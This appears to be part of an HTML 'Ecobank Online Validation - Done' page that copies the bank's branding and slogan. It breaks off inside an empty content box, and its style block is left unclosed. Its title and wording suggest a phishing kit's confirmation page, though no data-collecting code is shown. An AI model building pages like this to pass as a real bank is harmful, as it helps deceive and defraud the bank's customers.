<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ecobank Online Validation - Done</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        background: linear-gradient(180deg, #0a3d7a, #0e5ca5);
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: flex-start;
    }

    .container {
        width: 90%;
        max-width: 450px;
        margin-top: 40px;
        text-align: center;
    }

    .header-box {
        background-color: #0d4c8b;
        color: white;
        padding: 18px;
        font-size: 20px;
        font-weight: bold;
        border-radius: 40px;
        margin-bottom: 15px;
    }

    .subtitle {
        color: white;
        font-size: 14px;
        margin-bottom: 25px;
        letter-spacing: 1px;
    }

    .content-box {
        background: white;
        border-radius: 20px;
        padding: 30px 20px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }

    .content-box h2 {
        color: #1ba548;
        font-size: 22px;
        margin-bottom: 10px;
    }

    .content-box p {
        color: #333;
        font-size: 15px;
        line-height: 22px;
        margin-bottom: 20px;
    }

</head>

<div class="container">
    <div class="header-box">ECOBANK ONLINE VALIDATION</div>

    <div class="subtitle">A BETTER WAY TO BANK YOUR WAY</div>

    <div class="content-box">
